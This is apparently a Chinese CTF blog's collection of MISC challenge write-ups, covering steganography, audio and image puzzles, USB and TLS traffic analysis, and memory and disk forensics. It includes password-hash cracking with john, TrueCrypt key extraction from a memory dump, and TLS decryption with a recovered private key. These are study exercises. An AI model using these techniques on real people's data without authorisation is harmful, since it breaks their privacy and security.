files](https:&#x2F;&#x2F;static.ctf.insecurity-insa.fr&#x2F;a7572eb34ba9700b39f1ba7f5869bf301b67d406.tar.gz)\n和类似这样的1755行字符\nM73 P0 R2M201 X9000 Y9000 Z500 E10000M203 X500 Y500 Z12 E120M204 P2000 R1500 T2000M205 X10.00 Y10.00 Z0.20 E2.50M205 S0 T0M107\n通过查询得知这是一种G语言\n以及网站\nhttps://ncviewer.com/\n类似画图的意思\n\nflag&#123;3d_pr1nt3d_fl49&#125;\n47\n\n\n注意：得到的 flag 请包上 flag{} 提交\nHint:闪烁的光芒;是一行不是一列;加密方式很常见\n\n挺有意思但是也挺让人难受的题目\n得到flag.mp4和vocal.rar\nflag.mp4是一段监控，能得到一张二维码\n给出一个加密的网盘地址\nhttps://pan.baidu.com/s/1tygt0Nm_G5fTfVFlgxVcrQ\n根据提示1，反复观看视频，根据中央闪烁的光芒，得到一段摩斯电码：\n-.-- .-- —… --.\nyw8g\n从而得到网盘里的数独题：\n\n得到密钥52693795149137\n需要密钥的常用密码？\n首选AES\n成了，GG0kc.tf\n得到ovex文件，利用overture打开，\n音符中找到’fun}‘,‘is_’,’{gkctf_’\nflag&#123;gkctf_is_fun&#125;\n48\n\n\n得到的 flag 建议包上 flag{} 提交。\n感谢西北工业大学信息安全协会供题。\n\n老千层饼了\n得到lookatme.txt,maybehint.txt,secret\n1)先看lookatme.txt\nachnrvxzzuglarucalznwcygfggrufryvbzqjoxjymxvchhhdmliddcwmhghclpebtzwlojvew \t  \t\t\t\t\t\t \t \t \t\t\nnotepad++能看到末尾存在莫斯电码，解码：AUTOKEY\n通过查询，为一种加密方法，得到解密脚本\nhttps://github.com/hitcxy/break_autokey\nhttp://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/\n得到：IAMTHEPASSWD\n2)再看maybehint.txt\n通过vim查看，能看到一些&lt;200b&gt;&lt;200c&gt;&lt;200d&gt;字样，通过宽字符隐写解密网站http://330k.github.io/misc_tools/unicode_steganography.html，末尾需要设置勾选\n\n能得到提示:do u know NTFS?\n打开NtfsStreamsEditor2，对整个文件夹进行扫描，得到\n&#x3D;wwZlZ&#x3D;8W&#x3D;cndwljcdcG8wdj8W8Z8dZllGjZc&#x3D;8lWjnlWd8WwZ5j&#x3D;l8ccWZcZGjd5ZwZ5WZ8d&#x3D;Zcwjwl5Gnn&#x3D;WdwcwlnWd5lGnZWlnnwdnjnw8ndnc58d5cndl&#x3D;njZl&#x3D;WddjwWWwZllj5c5jGwZnZ5W&#x3D;cZljdwd8c&#x3D;85ndGGljcl5ccwd&#x3D;W&#x3D;l8w&#x3D;5lwWn8WnwnWlGZwdcnGGl5G&#x3D;8W&#x3D;&#x3D;cnnWZnWjZ&#x3D;wWcGwZcWc8ncWW&#x3D;5jnWwcZl8W&#x3D;8cdwWldlnwW5ddwlnlwncWlcwGZddj5djZWc5jcWdn5jdjwnj85GWGjnjwGd&#x3D;jZGj5j&#x3D;&#x3D;jwjlw8dlwWj5Wjn5n8dwwdjZlc5lZwdWldZlnGwl85cWnjd&#x3D;WcWlwj8WGdlGncnZWGGd5ZncW5d55nW5wl&#x3D;Wj8jGWnWj8jwZ&#x3D;ZwWZ88nWG5nn5WlWnGdWw5Zn8jdl&#x3D;nGcnll8WncZjnGn&#x3D;dlwn5W8wlWjlnl5ccnGWGnnnc58WnjlGnG55Zwdn5cZdjdZZ5WljG5G5wcldd&#x3D;Wlc8Z&#x3D;8nGj&#x3D;jWd8w8Wd&#x3D;w8nccc8wZdjcnGdljZnnj5ww8885&#x3D;lcWW8W8j5dG8jZZwG55GjnwZ&#x3D;W5Z8G5ZlGc5ZZncZ5cd8j85GW5nj&#x3D;WWncn55Gj5nj5nwnW58jG8GcnjZdWcl8wj8n&#x3D;cj&#x3D;8l8cn5jjcjn8lldn&#x3D;Gjw8&#x3D;cjcdWWjGddZljdjdZnG8djnZccZldlWllw5ZZ8wj5Gn&#x3D;&#x3D;5w8Z&#x3D;j55n&#x3D;ZZ5wdww8lndwd8Wlj8WGjnl&#x3D;nncZ&#x3D;W8ZZWZnjjlwWGZZlZc5c&#x3D;&#x3D;d8Zl855wZn&#x3D;W&#x3D;w8wWjZ85cGc&#x3D;&#x3D;5Z8ccjdw5GnZWnGjcdGGnZ5wwwWGG5d&#x3D;W5ldjwGZZdZwdG5cGGnZGlGc&#x3D;W5ccWZ8&#x3D;cGljdGcdld&#x3D;8cj8jwn&#x3D;lj88ZZ5jn5lcZ&#x3D;Gdw&#x3D;Zl58WZZl5ccwccwG5d5w8Z5wllj5ddnn&#x3D;5&#x3D;w8588WwGj&#x3D;l5G55dWG8cl&#x3D;GcjWwlwG&#x3D;lWWnZ&#x3D;dZG85Gcjc5&#x3D;wnw&#x3D;j&#x3D;&#x3D;Gndnddjwn5c&#x3D;c5W5wwdWlG5nWZwnGw8&#x3D;lcWldcwnG5Wcjj&#x3D;cWlGZc8Gn58ZWjZ85ljlncZj5cc&#x3D;dZWGjd&#x3D;d8ncZ8www55&#x3D;cw&#x3D;GWZn5ZZlnWld&#x3D;cWcnclWlZG5djGW&#x3D;cl8&#x3D;ZG8cZwwc8wl&#x3D;88W5ZwZ&#x3D;jwZGGlcWcWnZZ5Zj5w5ZdZclZZWnccGw&#x3D;&#x3D;cG8W8ZWlc8wcZ555Z85ljWG5jZ&#x3D;8&#x3D;wllWjWjlZc5lG8cwWlnjlGlW&#x3D;l5&#x3D;n&#x3D;lGwnjGGjGdwj85ddW5ZwZ&#x3D;ddjWldj&#x3D;cjljjGwndZjWWZGcdWcZW5cdldj8WZjGljlWncZ5&#x3D;8jnZWjl8wjZG5Zwlcl5dd\n明显词频分析：ZW5jcnlwdG8=\nbase后：encrypto\n通过查询，encrypto为一加密软件https://macpaw.com/encrypto\n加密后统一后缀为.crypto\n更改secret为secret.crypto\n3)结合lookatme.txt中得iamthepasswd，尝试解密\n始终无法解密，卡住\nstrings secret.crypto，发现异常字符(Oh! You caught me! But…)\n在010中选中并删除后，重新保存，解密\n得到彩虹.png\n得益于做题经验，放进ps，查看相近的黄色色块，得到不同之处:112 64 115 115 87 100\np@ssWd\n尝试提交flag，错误\n继续查看图片，更改后缀为.zip，解密得到弗拉格.docx\neeeeeeeeeepaeaeeeaeAeeeeeeaeeeeeeeeeeccccisaaaaeejeeeeeejiiiiiiLiiiiijeeeeeejeeeeeeeeeeeeeeeeeeeejcceeeeeeeeeeePeeeeeeeejaaiiiiiiijcciiiiiiiiiijaaijiiiiiiiiiiiiiiiiiiiijeeeeeeHeeeeeeeeeeeeeeeeejcceeeeeeeeeeeejaaiiiijeeeeeeejceeeeeeeeeeeeeeeeeeeeeeeeejceeeeeeeeeeeeeeeeejaeeeeeejciiUiiiiiiiiiiiiiiiiijaeeeejceeeeeeeeeCeeeeeeeeejajciiiiiiiiiiiiiiiiiiijaaiiiijiijeeeeeeeeeeejKcciiiiiiiiiiiiiiijaaij\n捡出大写字母ALPHUCK\nhttps://www.dcode.fr/alphuck-language\n解密得\n\nflag&#123;1t&#39;s_v3ry_De1iCi0us~!&#125;\n好家伙\n","tags":["MISC"]},{"title":"MISC-data-0","url":"/2021/04/30/MISC-data-0/","content":"DATA[0]\n\n1：USB流量分析\nUsbKeyboardDataHacker\ntshark -r .&#x2F;example.pcap -T fields -e usb.capdata\npython UsbKeyboardDataHacker.py .&#x2F;example.pcap \n#!&#x2F;usr&#x2F;bin&#x2F;env python# -*- coding:utf-8 -*-usb_codes &#x3D; &#123;    0x04: &quot;aA&quot;, 0x05: &quot;bB&quot;, 0x06: &quot;cC&quot;, 0x07: &quot;dD&quot;, 0x08: &quot;eE&quot;, 0x09: &quot;fF&quot;,    0x0A: &quot;gG&quot;, 0x0B: &quot;hH&quot;, 0x0C: &quot;iI&quot;, 0x0D: &quot;jJ&quot;, 0x0E: &quot;kK&quot;, 0x0F: &quot;lL&quot;,    0x10: &quot;mM&quot;, 0x11: &quot;nN&quot;, 0x12: &quot;oO&quot;, 0x13: &quot;pP&quot;, 0x14: &quot;qQ&quot;, 0x15: &quot;rR&quot;,    0x16: &quot;sS&quot;, 0x17: &quot;tT&quot;, 0x18: &quot;uU&quot;, 0x19: &quot;vV&quot;, 0x1A: &quot;wW&quot;, 0x1B: &quot;xX&quot;,    0x1C: &quot;yY&quot;, 0x1D: &quot;zZ&quot;, 0x1E: &quot;1!&quot;, 0x1F: &quot;2@&quot;, 0x20: &quot;3#&quot;, 0x21: &quot;4$&quot;,    0x22: &quot;5%&quot;, 0x23: &quot;6^&quot;, 0x24: &quot;7&amp;&quot;, 0x25: &quot;8*&quot;, 0x26: &quot;9(&quot;, 0x27: &quot;0)&quot;,    0x29: &quot;*&quot;,# &lt;ESC&gt;    0x2C: &quot;  &quot;, 0x2D: &quot;-_&quot;, 0x2E: &quot;&#x3D;+&quot;, 0x2F: &quot;[&#123;&quot;, 0x30: &quot;]&#125;&quot;, 0x32: &quot;#~&quot;,    0x33: &quot;;:&quot;, 0x34: &quot;&#39;\\&quot;&quot;, 0x36: &quot;,&lt;&quot;, 0x37: &quot;.&gt;&quot;, 0x38: &quot;&#x2F;?&quot;, 0x39: &quot;&lt;CAP&gt;&lt;CAP&gt;&quot;,    0x3a: &quot;&lt;F1&gt;&lt;F1&gt;&quot;, 0x3b: &quot;&lt;F4&gt;&lt;F4&gt;&quot;, 0x3e: &quot;&lt;F5&gt;&lt;F5&gt;&quot;, 0x3f: &quot;&lt;F6&gt;&lt;F6&gt;&quot;,    0x40: &quot;&lt;F7&gt;&lt;F7&gt;&quot;, 0x41: &quot;&lt;F8&gt;&lt;F8&gt;&quot;, 0x42: &quot;&lt;F9&gt;&lt;F9&gt;&quot;, 0x43: &quot;&lt;F10&gt;&lt;F10&gt;&quot;,    0x44: &quot;&lt;F11&gt;&lt;F11&gt;&quot;, 0x45: &quot;&lt;F12&gt;&lt;F12&gt;&quot;&#125;data &#x3D; &#39;&#39;for x in open(&quot;uuu.txt&quot;, &quot;r&quot;).readlines():    code &#x3D; int(x[4:6], 16) # 有冒号时提取数据的[6:8]，无冒号时数据在[4:6]    # print(x[4:6])    if code &#x3D;&#x3D; 0:        continue    if code &#x3D;&#x3D; 0x28:        print(&#39;ENTER!&#39;)        print(data)        data &#x3D; &#39;&#39;        continue    upper &#x3D; 0    if int(x[0:2], 16) &#x3D;&#x3D; 0x02 or int(x[0:2], 16) &#x3D;&#x3D; 0x20:        upper &#x3D; 1    data +&#x3D; usb_codes[code][upper]print(data)\n上述脚本与常规不同之处在于0x29: “*”,# ,对0x29进行了处理，暂且用*代替\n为解决题目中模拟vim编辑的情况。\n","tags":["MISC"]},{"title":"MISC-audio-1","url":"/2020/12/25/MISC-audio-1/","content":"audio[1]\n\n启示：MISC永远是管中窥豹\n\n之前看过一句话，MISC是CTF入门的好起点，因为它够有趣，正反馈及时。像密室逃脱，但必须记住，MISC永远是管中窥豹，你会的永远只是冰山一角。尽管它能让你得到短暂的快乐，尤其刷有WP的题下，极其容易陷入“搜索，（复现），提交，正确”的快乐里。\n\n\n但真正比赛时只能自己不断探索、尝试，多走很多弯路，最终也不一定能走出死胡同，因此目前笔者认为，在处处是脑洞的MISC学习过程中，学会写脚本并养成发散思维，是比得到该题的flag更重要的。\n\n\n1\nRX-SSTV图像解码软件+Virtual Audio Cable虚拟音频线\n\n\nDescription:Decode this message from the moon.\nHints:(1)How did pictures from the moon landing get sent back to Earth?(2)What is the CMU mascot?, that might help select a RX option\n\n经过Hints提示后，查阅资料得知，该题与慢扫描电视SSTV有关，下载程序后,尝试了多次，都只得到了同老式电视信号极差时相似的雪花片。\n继续搜集资料，得一BILIBILI教学视频。配置好参数后，依旧是雪花片，且观察到咱自己的音频轨道总是起伏不大甚至是0，愣了很久，才终于发现了华点（太菜了）\n视频中提到了Virtual Audio Cable虚拟音频线，浅薄理解就是一个轨道，不通过各种其他的转译(如先前的方法，即是通过了电脑放出声音，再通过其他介质传播后被电脑收集，而此方法则是避免了中间过程)，直接将工具与音频相连，尽量产生更少的噪点。\n(1)Setup-&gt;Sound Control and Devices\n(2)播放-&gt;Line1\n(3)录制-&gt;Line1\n(4)根据Hints2,得卡内基梅隆大学得吉祥物为Scotty the Scottie Dog,SSTV中的RX选项设置为Scottie1.\n(5)播放音频\n(6)SSTV中-&gt;Receiving\n下图为正在处理过程中👇\n\nSave as 导出最终图像👇\n\n翻转后得flag。\n\n2\nRX-SSTV图像解码软件+steghide\n\n\nDescription:Revisit the last transmission. We think this transmission contains a hidden message. There are also some clues clue 1, clue 2, clue 3.\nHints:Use the clues to extract the another flag from the .wav file\n\n看样子是上一题的延伸，分别对四个音频都采用同做法，可得四张图片👇\n\n\n\n\n根据第四张图片搜索Alan Eliasen the futureboy,得到一网站,根据clue1.jpg以及对链接含义,猜测下一步为“Steganography隐写术”。\n进入目标网页后尝试了一波，无果，此时看到：These pages use the steghide program to perform steganography, and the files generated are fully compatible with steghide. If you really want to be secure, or do brute-force attacks, you’ll want to use these programs on your own system.\n利用手头的steghide工具，对message.wav执行命令：\n\n在txt里得到flag.\n\n启示：结合题意，理解出题人的意思很重要😂，最后一步对message.jpg操作了好久，啥都没有555\n\n\n3\nKinovea+base64加密的文件’头‘\n\n\n得到的 flag 请包上 flag{} 提交。\n\n\n是经典题目了（去补了一下为啥说这是亲爱的热爱的里面的梗😂一开始以为是纯将视频按帧查看，了解了一个好用的软件Kinovea\n\n视频按帧查看得到隐藏的二维码\n\n\n\n通过试别，分别为iwantplay\n尝试后不对。\n查看视频的十六进制，得一串base64\nõUmFyIRoHAQAzkrXlCgEFBgAFAQGAgADh7ek5VQIDPLAABKEAIEvsUpGAAwAIZmxhZy50eHQwAQADDx43HyOdLMGWfCE9WEsBZprAJQoBSVlWkJNS9TP5du2kyJ275JzsNo29BnSZCgMC3h+UFV9p1QEfJkBPPR6MrYwXmsMCMz67DN&#x2F;k5u1NYw9ga53a83&#x2F;B&#x2F;t2G9FkG&#x2F;IITuR+9gIvr&#x2F;LEdd1ZRAwUEAA&#x3D;&#x3D;\n解密后得\nRar!\u001a\u0007\u00013µå\u0001\u0005\u0006\u0005\u0001\u0001áíé9U\u0002\u0003&lt;°\u0004¡ KìR\u0003\bflag.txt0\u0001\u0003\u000f\u001e7\u001f#,Á|!&#x3D;XK\u0001fÀ%\u0001IYVRõ3ùví¤È»äì6½\u0006t\u0003\u0002Þ\u001f\u0015_iÕ\u0001\u001f&amp;@O&#x3D;\u001e­\u0017Ã\u00023&gt;»\fßäæíMc\u000f&#96;kÚóÁþÝôY\u0006ü\u0013¹\u001f½ëü±\u001dwVQ\u0003\u0005\u0004\n能看出这是将一个压缩包的十六进制编码进行了base64的结果\n根据脚本\nimport base64code&#x3D;&quot;UmFyIRoHAQAzkrXlCgEFBgAFAQGAgADh7ek5VQIDPLAABKEAIEvsUpGAAwAIZmxhZy50eHQwAQADDx43HyOdLMGWfCE9WEsBZprAJQoBSVlWkJNS9TP5du2kyJ275JzsNo29BnSZCgMC3h+UFV9p1QEfJkBPPR6MrYwXmsMCMz67DN&#x2F;k5u1NYw9ga53a83&#x2F;B&#x2F;t2G9FkG&#x2F;IITuR+9gIvr&#x2F;LEdd1ZRAwUEAA&#x3D;&#x3D;&quot;r&#x3D;base64.b64decode(code)test_file&#x3D;open(&quot;test.rar&quot;,&quot;wb&quot;)test_file.write(r)test_file.close()\n得到还原后的压缩包，输入密码iwantplay,错误\n猜测密码为iwantplayctf，得到flag\nroarctf{CTF-from-RuMen-to-RuYuan}\n4\nDTMF编码\n\n\n得到的 flag 请包上 flag{} 提交。\n感谢 Iven Huang 师傅供题。\n比赛平台：https://ctfgame.w-ais.cn/\n\n得到一音频，很明显是电话音\ndtmf2num\n&gt;dtmf2num girlfriend.wavDTMF2NUM 0.1cby Luigi Auriemmae-mail: aluigi@autistici.orgweb:    aluigi.org- open girlfriend.wav  wave size      7466540  format tag     1  channels:      2  samples&#x2F;sec:   44100  avg&#x2F;bytes&#x2F;sec: 176400  block align:   4  bits:          16  samples:       3733270  bias adjust:   215  volume peaks:  -12024 12025  normalize:     20742  resampling to: 8000hz- MF numbers:    47777777- DTMF numbers:  999*666*88*2*777*33*6*999*4*4444*777*555*333*777*444*33*66*3*7777\n999*666这串字符是啥意思呢，一开始以为是乘起来的意思。\n后来知道是类似诺基亚手机的打字方式（按三次9就是y啦\nflag&#123;youaremygirlfriends&#125;\n5\n利用010editor进行二进制异或\n\n\n得到的 flag 请包上 flag{} 提交。\n感谢 Iven Huang 师傅供题。\n比赛平台：https://ctfgame.w-ais.cn/\n\n学到了\n得到一个后缀名为.m4a的音频，audacity没法处理，以为是高级音频的原因。在线网站转mp3失败\n查看二进制，发现有很多不知是Al还是A1的文本\n通过Tool-&gt;Hex-&gt;Binary XOR进行二进制异或\n\n得到了正常的音频文件，能听出是\nabcdfghijk\n6\n电动车(?)地址位\n\n\n得到的 flag 请包上 flag{} 提交。\n\n得到一份音频文件，利用Audacity打开，观察频谱，得到一串长短波\n0 0111010010101010 0 110 0010 0 011101001010101001100010\n参考以下文章\nhttps://www.freebuf.com/articles/wireless/191534.html\nflag{01110100101010100110}\n7\n不要形成固定思维\n\n\n得到的 flag 请包上 flag{} 提交。\n\n得到out.wav，通过au打开，查看频谱等对音频进行处理的方法，都未果，一时陷入僵局\nbinwalk后发现不只是.wav这么简单\nsteghide out.wav\n得到\nhttps:&#x2F;&#x2F;share.weiyun.com&#x2F;5wVTIN3\n获得一张图片\n\\u0034\\u0030\\u0037\\u0030\\u000d\\u000a\\u0031\\u0032\\u0033\\u0034\\u000d\\u000a\n控制台Unicode解码\n40701234\n尝试flag{5304}或flag{2836}\n8\n新工具Sonic Visualiser\n\n\n得到的 flag 请包上 flag{} 提交。\n\n.wav\n先常规走一走，au查看频谱，没有。\n试过隐写，也无。\n看了大佬的WP得到了新工具Sonic Visualiser，目测是个高级的AU，调整参数后得到flag\n\nutflag&#123;sp3tr0gr4m0ph0n3&#125;\n9\n新工具DeepSound2.0&amp;通过文件hash值爆破\n[ so deep](%20so%20deep)\n\n得到的 flag 请包上 flag{} 提交。\n\n前半段常规新手操作au查看final_flag.wav，得到一半flag\nINSA&#123;Aud1o_st3G4n\n后半部分需要一个新工具DeepSound\n链接：https://pan.baidu.com/s/1wsY5d2fp6cQJiDyUj2KWZA\n提取码：dqlu\n提示需要密码\n\n第一步：python3 deepsound_john.py final_flag.wav &gt;hash\n提取hash值\n第二步：john hash\n通过hash值进行爆破得到密码：azerty\n返回deepsound进行破解得到flag2.txt\n0_1s_4lwayS_Th3_S4me&#125;\n结合得完整flag\n","tags":["MISC"]},{"title":"MISC-data-2","url":"/2021/03/22/MISC-data-2/","content":"Data[2]\n\n21\n\n\n得到的 flag 请包上 flag{} 提交。来源：https://github.com/hebtuerror404/CTF_competition_warehouse_2018\n\n得到attachment.img\n第一感觉是volatility,失败\n学到了新招\nextundelete attachment.img --restore-all\n恢复被删除的目录或文件\n得到RECOVERED_FILES/file.17\n\nflag&#123;fugly_cats_need_luv_2&#125;\n22\n\n\n得到的 flag 请包上 flag{} 提交。\n\n不明所以，稍作记录。\n得到一个数据包，通过追踪发现存在ssc.key，格式类似rsa私钥，另存为\n编辑-&gt;首选项-&gt;protocols-&gt;TLS 把刚才的key通过本地导入\n追踪http得到flag\n23\n\n\n得到的 flag 请包上 flag{} 提交。\n\n得到一张图片\nbinwalk foremost都无果的情况下\nzsteg -a diskimage.png\n\n&quot;b8,rgb,lsb,xy&quot;中存在东西\nzsteg -e &#39;b8,rgb,lsb,xy&#39; diskimage.png &gt; disk.dat\n导出\n用testdisk进行分析\n\n回车\n\n回车\n\n找到其中最与众不同的那一个\n根据提示，按C拷贝到想要的位置\n查看\n\n得到flag\nCTF&#123;FAT12_FTW&#125;\n24\n\n\n得到的 flag 请包上 flag{} 提交。\n\n得到encrypt.vmdk\n一时没有方向，拖进010看到\nrctf&#123;unseCure_quick_form4t_vo1ume\n试图打开vmdk却被告知压缩包已损坏\n这里学到一招，可以用7z\nhttps://sparanoid.com/lab/7z/\n可以看到有一个0.fat\n但无法直接操作\n通过‘提取’得到0.fat\n\n[FAT文件可以使用VeraCrypto进行挂载]\nhttps://www.veracrypt.fr/en/Downloads.html\n存在密码，rctf能解\n到这一步挂载成功：\n\n看看是啥：\n\n给了另一个密码：RCTF2019\n这里体现了神奇之处：在挂载输入密码的时候，不同的密码可以进入不同的文件系统\n重新挂载：\n却被告知无法访问，需要格式化等\n参考之前，但无法直接拖入010，换winhex试试\nwinhex-&gt;Tools-&gt;Open Disk-&gt;Select Disk,选择挂载的盘\n得到后半部分\n_and_corrupted_1nner_v0lume&#125;\nrctf&#123;unseCure_quick_form4t_vo1ume_and_corrupted_1nner_v0lume&#125;\n25\n\n\nhttp://dd.zhaoj.in/3ehg38dgey84d3dhou32d3/mem.raw\n得到的 flag 请包上 flag{} 提交。\nHint:记事本\n\n这是一道复现地很费劲的题😂\n得到mem.raw和VOL(VOL对应后面链接失效的地方,按下不表)\n内存取证起手式：\nvolatility -f mem.raw imageinfo\n得到可能版本后\nvolatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 pslist\n查看进程\n\n关注\nTrueCrypt.exe   3364\nnotepad.exe     3552\nmspaint.exe     2648\n分别dumpit\nvolatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 3364 --dump-dir&#x3D;.&#x2F;volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 3552 --dump-dir&#x3D;.&#x2F;volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 2648 --dump-dir&#x3D;.&#x2F;\n挨个看\n1)mspaint\n此处需要用到Gimp工具，一个类似画图的工具得到密码：\n1YxfCQ6goYBD6Q\n2)notepad\n使用editbox插件\nvolatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 editbox\n\n得到网盘链接，但已失效，对应题干中的VOL\n3)TrueCrypt\nTrueCrypt破解工具Elcomsoft Forensic Disk Decryptor\nDecrypt or mount disk-&gt;TrueCrypt-&gt;select&amp;Memory dump&amp;Browse-&gt;mount\n发现多了个盘，其中存在key\nuOjFdKu1jsbWI8N51jsbWI8N5\n得到VOL的时候就该想到需要挂载，使用VeraCrypt,按之前学到的用法\n此处注意需要勾选TrueCrypt\n\n得到fffflag.zip\nfffflag\nRoarCTF&#123;wm_D0uB1e_TC-cRypt&#125;\n26\n\n\n提示一：若感觉在中间某个容易出错的步骤，若有需要检验是否正确时，可以比较MD5: 90c490781f9c320cd1ba671fcb112d1c\n提示二：注意补齐私钥格式\n-----BEGIN RSA PRIVATE KEY-----\nXXXXXXX\n-----END RSA PRIVATE KEY-----\n得到的 flag 请包上 flag{} 提交。\n\n得到\n\n&#x3D;20&#x3D;20&#x3D;E5&#x3D;B0&#x3D;8F&#x3D;E5&#x3D;BC&#x3D;A0&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E5&#x3D;A5&#x3D;BD&#x3D;EF&#x3D;BC&#x3D;9A&#x3D;20&#x3D;20&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E5&#x3D;A5&#x3D;BD&#x3D;EF&#x3D;BC&#x3D;8C&#x3D;E8&#x3D;AF&#x3D;B7&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E5&#x3D;B0&#x3D;86&#x3D;E5&#x3D;AF&#x3D;86&#x3D;E9&#x3D;92&#x3D;A5&#x3D;E5&#x3D;AE&#x3D;89&#x3D;E8&#x3D;A3&#x3D;85&#x3D;E5&#x3D;88&#x3D;B0&#x3D;E6&#x3D;9C&#x3D;8D&#x3D;E5&#x3D;8A&#x3D;A1&#x3D;E5&#x3D;99&#x3D;A8&#x3D;E4&#x3D;B8&#x3D;8A&#x3D;E3&#x3D;80&#x3D;82&#x3D;E8&#x3D;B0&#x3D;A2&#x3D;E8&#x3D;B0&#x3D;A2&#x3D;20&#x3D;20&#x3D;20\nQuoted-Printable\nhttp://www.mxcz.net/tools/quotedprintable.aspx\n解码后\n小张你好：你好，请你将密钥安装到服务器上。谢谢\n以及一堆base64编码传输数据\n解码后得到png\n\n识图后调了好久\n补齐私钥格式后，\nwireshark里，编辑-&gt;首选项-&gt;Protocols-&gt;TLS-&gt;RSA keys list-&gt;Edit\n再追踪其中的http流\n得到flag\nDDCTF&#123;0ca2d8642f90e10efd9092cd6a2831c0&#125;\n","tags":["MISC"]},{"title":"MISC-image-0","url":"/2021/04/21/MISC-image-0/","content":"image[0]\n\n一张图片的百种姿势\n1：bpg\n工具：bpg-0.9.8-win64命令：bpgdec -o out.png misc3.bpg\n2：IDAT块异常\n\nIDAT未满65524就有下一个数据块了，说明有问题\ndelete后得到\n\n3：IDAT长度转ASCII\n4：pngdebugger校验crc32\n错误的crc-code串联转ascii\nCRC OK!   ===》   1\nCRC FAILED   ===》   0\n5：image爆破长宽\nimport structimport zlibfor i in range(4096):    for j in range(4096):        c &#x3D; bytes.fromhex(&#39;4948445200000384000000960802000000&#39;)# IHDR        ihdr &#x3D; c[:4]+struct.pack(&#39;&gt;i&#39;,i)+struct.pack(&#39;&gt;i&#39;,j)+c[12:]        crc &#x3D; 0x5255A798# CRC32        if zlib.crc32(ihdr) &#x3D;&#x3D; crc:            print(hex(i),hex(j))            exit(0)\n\n6：png爆破高度\n# -*- coding: utf8 -*-import osimport binasciiimport structmisc = open(&quot;misc26.png&quot;, &quot;rb&quot;).read()# 爆破宽for i in range(1024):    data = misc[12:16] + struct.pack(&#x27;&gt;i&#x27;,i)+ misc[20:29]  #IHDR数据    crc32 = binascii.crc32(data) &amp; 0xffffffff    if crc32 == 0xEC9CCBC6: #IHDR块的crc32值        print(&#x27;weight&#x27;)        print(i)        print(&quot;hex:&quot;+hex(i))# 爆破高for i in range(1024):    data = misc[12:20] + struct.pack(&#x27;&gt;i&#x27;,i)+ misc[24:29]    crc32 = binascii.crc32(data) &amp; 0xffffffff    if crc32 == 0xEC9CCBC6:        print(&#x27;height&#x27;)        print(i)        print(&quot;hex:&quot;+hex(i))                #height#606#hex:0x25e\n7：bmp修改高度\n\n\n12-15：4字节的biWidth，这里是0x00000280，即十进制的640，用像素表示图像的宽度，查看文件信息验证正确；\n16-19：4字节的biHeight，这里是0x000001E0，即十进制的480，用像素表示图像的高度，查看文件信息验证正确；同时，这是一个正数，表示图像是倒立的，即图像数据是从左下角到右上角排列的；\n8：jpg修改高度\n\n9：gif修改高度\n\n后分离帧得到flag\n10：bmp爆破宽度\nimport structimport zlibf &#x3D; open(&#39;misc31.bmp&#39;,&#39;rb&#39;)c &#x3D; f.read()width &#x3D; c[18:22]height &#x3D; c[22:26]# 爆破bmp宽度for i in range(900,1100):    f1 &#x3D; open(str(i)+&#39;.bmp&#39;,&#39;wb&#39;)    # print(struct.pack(&#39;&gt;i&#39;,i)[::-1])    img &#x3D; c[:18]+struct.pack(&#39;&gt;i&#39;,i)[::-1]+c[22:]    f1.write(img)    f1.close()\n11：png爆破宽度\nimport structimport zlib#爆破png宽度f &#x3D; open(r&#39;misc34.png&#39;,&#39;rb&#39;)c &#x3D; f.read()width &#x3D; c[16:20]height &#x3D; c[20:24]for i in range(900,1200):    f1 &#x3D; open(str(i)+&#39;.png&#39;,&#39;wb&#39;)    # print(struct.pack(&#39;&gt;i&#39;,i)[::-1])    img &#x3D; c[:16]+struct.pack(&#39;&gt;i&#39;,i)+c[20:]    f1.write(img)    f1.close()\n12：遇到binwalk有东西，但分离不出的情况\n\n根据binwalk提示，尝试手动分离\n13：zsteg\n首先尝试binwalk -e\n发现bzip2\n\n进一步binwalk却始终存在问题\n\nzsteg misc17.png\n得到应该分离的数据段\n\nzsteg -e &quot;extradata:0&quot; &#x2F;root&#x2F;桌面&#x2F;misc17.png &gt; 1.txt\nbinwalk -e 1.txt\n14：exiftool查看附加信息\n15：gif考虑时间间隔/3637&gt;&gt;01\nidentify -format &quot;%T&quot; misc39.gif &gt; 1\n#coding&#x3D;utf-8text&#x3D;&#39;737363636373737373736373636373736363737363737373636373737373637363636373736373737373737373637373737373737363737363737363736373637373636373636373737363636363737363636373637373636373637373636373736373736363737363637373736363736373737363637363737363736373737363637373637373636363736363737363737373737363636373637373636373637363737363637363637373637373636373737363636373736363736363637373736363736373736373736363737363637373737363636363736373737363637373736363736373737363636373637373636363737373736363636373637373636363636373736373636363737363736373637373736363737373737373637&#39;.split(&#39;3&#39;)print(text)firstType &#x3D; &#39;6&#39;secondType &#x3D; &#39;7&#39;binaryString &#x3D; &#39;&#39;for char in text: #Foreach char    if char &#x3D;&#x3D; firstType: #Check if it is the first type        binaryString +&#x3D; &#39;0&#39; #Mark it as 0        # print(char)    else:        binaryString +&#x3D; &#39;1&#39; #Mark it as 1        # print(char)print(binaryString) #Print resultprint((len(binaryString)-1)&#x2F;7)binary&#x3D;&#39;&#39;for i in range(41):    binary +&#x3D; binaryString[7*i:7*i+7] + &#39; &#39;print(binary)#1100011 1110100 1100110 1110011 1101000 1101111 1110111 1111011 0110101 0110010 0111000 0110001 0110010 1100110 1100110 0111001 0111001 0110101 1100110 1100010 0110111 1100010 1100101 0110010 0110110 0111000 1100100 0111001 0110110 0110011 1100001 0111001 1100101 1100010 1100011 1100001 0110000 0110100 0110101 0111001 1111101 \n16：LSB改变通道，改变排序方式\n17：base\n18：取IDAT,IHDR部分重新排列\n1）IHDR领先\n2）IDAT尝试重新排列\n3）前后补全\n&lt;F5杯《Just Another 拼图》&gt;\n脑洞部分\n1：010按位取\n\n2：所有头的hex都该熟悉,各种hex魔转\nSerial Number                   : 686578285826597329\n686578285826597329=》hex(X&amp;Ys)\nX Resolution                    : 3902939465Y Resolution                    : 2371618619X Position                      : 1082452817Y Position                      : 2980145261&gt;&gt;&gt; 